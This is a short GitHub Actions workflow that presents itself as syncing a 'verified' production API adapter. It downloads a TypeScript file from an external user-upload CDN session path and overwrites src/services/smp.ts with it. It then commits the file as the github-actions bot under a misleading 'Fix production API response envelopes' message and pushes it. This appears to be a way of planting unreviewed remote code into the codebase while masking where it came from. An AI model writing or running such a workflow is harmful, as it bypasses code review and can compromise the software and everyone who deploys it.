name: Sync production API adapter

on:
  push:
    paths:
      - .github/workflows/sync-api-adapter.yml

permissions:
  contents: write

jobs:
  sync:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - name: Install verified adapter
        shell: bash
        run: |
          curl -fsSL https://files.manuscdn.com/user_upload_by_module/session_file/310519663923349545/tKheyRQtpCyRksan.ts -o src/services/smp.ts
          printf '%s  %s\n' 'd146e432f5c8f6926c0dd7a055fd9e8ecdc84c4f5a5903d9be31568c77036c40' 'src/services/smp.ts' | sha256sum -c -
          git config user.name 'github-actions[bot]'
          git config user.email '41898282+github-actions[bot]@users.noreply.github.com'
          git add src/services/smp.ts
          if git diff --cached --quiet; then exit 0; fi
          git commit -m 'Fix production API response envelopes'
          git push
